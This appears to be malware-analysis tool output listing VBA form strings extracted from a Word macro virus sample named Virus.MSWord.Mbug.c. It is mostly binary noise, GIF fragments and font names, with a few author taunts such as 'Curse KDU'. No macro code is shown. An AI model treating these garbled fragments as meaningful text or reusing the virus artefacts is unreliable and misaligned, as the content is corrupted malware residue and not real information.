- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C�� �0�*,���pb�X�n��V�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͠@l��V
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�B��VQ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I<�z]FAj��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eD�ǽ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C���p�FQ�c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D�ϴ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Zي�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A���C�/N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$X:�O���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��<5y���@�ъ-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b_��^#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g����H�N7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UY�r|V��"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��0B��[�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iJ<��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��! ����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tD*��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q0D�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j��	�ܢ]�3�?>m�N<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'#>H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rD�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H6���W�"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E�"	�J"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k����C0"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ʕARz�\&�[J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�)�i�0����DA���Gh� �8�"D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�y�-�)#�(ٰ���7�A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PZ�ε�GD��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���vy� �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#dQ�]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-x��<�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+BFѴ��h

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F����Tq�kr���;2���{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���J.�*<H��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*>��1��-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���D,,��̐B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�8��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�7V��ֻ���B��gO�������}ffb����&�=B>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�^���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�G0a��}�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i>s_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~X���0>-�Ͼ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3����0z/?��O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7|Q�w|��g~(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"8�$X�&x�(��*��,؂.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Who I am? Where I from? What I did? As long as I hate KDUh.b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Curse KDUwA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Click the Picture to view who I amK
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89aD
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
333fff�������������fff33̙��33�ff�333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3̙f@ 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�̙�h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��fff3�̙��3��f��333
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3��f3f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f3f3�̙3�3f�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�f������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�f3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�ff̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3̙
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ff��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��3ff���3��f��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�ff�33f���33�ff�33�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�33�ff�������3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3�f3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f3��f�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̙3�̙��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NETSCAPE2.0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� %n,Ar�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��ˊ0U�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8s֨8s&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@u��	�gУ;�f4�4�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6���ER�Q��J��S�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cJ�ڵE��`'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y�i5jm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�F��s_x����]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zt�<��Yƀ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h���ˌ�n�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s.��vQƌ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�i̩c?���5j�8E�ua�6ŵ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y����U�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�tv���1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
